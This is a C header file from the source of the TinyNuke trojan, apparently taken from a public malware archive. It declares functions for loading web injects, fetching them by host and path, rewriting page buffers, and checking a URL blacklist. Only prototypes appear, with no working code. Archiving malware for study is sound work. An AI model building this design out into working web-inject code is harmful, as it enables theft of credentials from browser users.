/*
  name      TinyNuke
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "..\Common.h"
#include "..\Panel.h"
#include "..\AiJson\AiJson.h"

void LoadWebInjects();
AiList *GetWebInject(char *host, char *path);
void ReplaceWebInjects(char **buffer, AiList *injects);
BOOL UrlIsBlacklisted(char *url);